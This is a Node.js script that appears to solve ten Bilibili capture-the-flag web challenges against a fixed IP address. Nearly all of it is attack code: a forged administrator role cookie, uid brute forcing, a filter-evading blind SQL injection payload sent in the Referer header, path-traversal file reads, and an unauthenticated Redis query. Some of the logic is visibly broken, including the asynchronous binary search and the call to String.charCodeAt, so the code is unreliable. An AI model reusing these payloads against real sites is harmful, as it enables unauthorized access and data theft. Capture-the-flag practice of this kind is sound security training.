const request = require("request");
const redis = require("redis");

let session = ""; // 此处填写个人 session

// 第一题 - 查源码 + 查请求
let func1 = function () {
  let url = "http://45.113.201.36/api/admin";
  let headers = {
    "User-Agent": "bilibili Security Browser",
    Cookie: `session=${session}`,
  };
  let callback = function (error, response, body) {
    if (!error && response.statusCode == 200) {
      console.log("flag1:", body.data);
    }
  };

  request(
    {
      url,
      headers,
      json: true,
    },
    callback
  );
};

// 第二题 - 修改UA
let func2 = function () {
  let url = "http://45.113.201.36/api/ctf/2";
  let headers = {
    "User-Agent": "bilibili Security Browser",
    Cookie: `session=${session}`,
  };
  let callback = function (error, response, body) {
    if (!error && response.statusCode == 200) {
      console.log("flag2:", body.data);
    }
  };

  request(
    {
      url,
      headers,
      json: true,
    },
    callback
  );
};

// 第三题
let func3 = function () {
  let url = "http://45.113.201.36/api/ctf/3";
  let role = "ee11cbb19052e40b07aac0ca060c23ee"; // 即 'user' 的 MD5 字符串, 题目提供，不需要修改，但可以给下一题做参考。
  let headers = {
    "User-Agent": "bilibili Security Browser",
    Cookie: `role=${role}; session=${session};`,
  };
  let callback = function (error, response, body) {
    if (!error && response.statusCode == 200) {
      console.log("flag3:", body.data);
    }
  };

  request.post(
    {
      url,
      headers,
      json: true,
    },
    callback
  );
};

// 第四题 - 修改Cookie - role
let func4 = function () {
  let url = "http://45.113.201.36/api/ctf/4";
  let role = "7b7bc2512ee1fedcd76bdc68926d4f7b"; // 即 'Administrator' 的 MD5 字符串, 需要修改。
  let headers = {
    "User-Agent": "bilibili Security Browser",
    Cookie: `role=${role}; session=${session};`,
  };
  let callback = function (error, response, body) {
    if (!error && response.statusCode == 200) {
      console.log("flag4:", body.data);
    }
  };

  request.post(
    {
      url,
      headers,
      json: true,
    },
    callback
  );
};

// 第五题 - 暴力破解
let func5 = function () {
  let uid = 100336889; // 初始 uid，题目源码中有提供。
  let url = `http://45.113.201.36/api/ctf/5?uid=${uid}`;
  let role = "ee11cbb19052e40b07aac0ca060c23ee";
  let headers = {
    "User-Agent": "bilibili Security Browser",
    Cookie: `role=${role}; session=${session};`,
  };
  let callback;
  callback = function (error, response, body) {
    if (!error && response.statusCode == 200) {
      if (body.flag === undefined) {
        uid++;
        request.post(
          {
            url,
            headers,
            json: true,
          },
          callback
        );
      } else {
        console.log("flag5:", body.data);
        return;
      }
    }
  };

  request.post(
    {
      url,
      headers,
      json: true,
    },
    callback
  );
};

// 第六题 - SQL注入
let func6 = function () {
  let url = "http://45.113.201.36/blog/single.php?id=1";
  let flag = "";
  let role = "ee11cbb19052e40b07aac0ca060c23ee";

  for (let i = 1; i <= 100; i++) {
    let left = 33;
    let right = 128;

    while (right - left != 1) {
      let mid = Math.floor((left + right) / 2);
      let payload = `0123'^if(substr((selselectect flag from flag),${i},1)>binary ${mid.toString(
        16
      )},(selecselectt 1+~0),0) ununionion selecselectt 1,2#`;
      let headers = {
        Cookie: `role=${role}; session=${session};`,
        Referer: payload,
      };
      let callback = function (error, response, body) {
        if (!error && response.statusCode == 200) {
          if (body.data.length == 5596) {
            left = mid;
          } else {
            right = mid;
          }
        }
      };
      request(
        {
          url,
          headers,
          json: true,
        },
        callback
      );
    }
    flag = String.charCodeAt(right);
  }
  console.log("flag6:", flag);
};

// 第七题 - 任意文件读取
let func7 = function () {
  let url = "http://45.113.201.36/api/images?file=../../../flag7.txt";
  let role = "7b7bc2512ee1fedcd76bdc68926d4f7b";
  let headers = {
    "User-Agent": "bilibili Security Browser",
    Cookie: `role=${role}; session=${session};`,
  };
  let callback = function (error, response, body) {
    if (!error && response.statusCode == 200) {
      // 文件读取
    }
  };

  request(
    {
      url,
      headers,
      json: true,
    },
    callback
  );
};

// 第八题 - 查Redis
let func8 = function () {
  const client = redis.createClient(6379, "45.113.201.36");
  const callback = function () {
    client.get("flag8", function (err, reply) {
      if (!err) {
        console.log(reply.toString());
      }
    });
  };
  client.on("connect", callback);
};

// 第九题 - 任意文件读取 + 密钥解密
let func9 = function () {
  let url = "http://45.113.201.36/api/images?file=../../../secret.txt";
  let role = "ee11cbb19052e40b07aac0ca060c23ee";
  let headers = {
    "User-Agent": "bilibili Security Browser",
    Cookie: `role=${role}; session=${session};`,
  };
  let callback = function (error, response, body) {
    if (!error && response.statusCode == 200) {
      // 得到加密字符串，该字符串解密后即为 flag
    }
  };

  request.post(
    {
      url,
      headers,
      json: true,
    },
    callback
  );
};

// 第十题 - Meta Type
let func10 = function () {
  let url = "http://45.113.201.36/blog/end.php?id[]=&url=flag.txt"; // dirsearch 后，得知存在 /blog/test.php，返回内容为 jsfuck 编码的 JS 代码，转义后为var str1 = "程序员最多的地方"; var str2 = "bilibili1024havefun"; console.log()。Github 上找到对应仓库后根据提示得到该URL。
  let role = "ee11cbb19052e40b07aac0ca060c23ee";
  let headers = {
    "User-Agent": "bilibili Security Browser",
    Cookie: `role=${role}; session=${session};`,
  };
  let callback = function (error, response, body) {
    if (!error && response.statusCode == 200) {
      // 返回图片，通过二进制文件查看器可以发现隐藏的flag
    }
  };

  request.post(
    {
      url,
      headers,
      json: true,
    },
    callback
  );
};

func1();
func2();
func3();
func4();
func5();
func6();
func7();
func8();
func9();
func10();
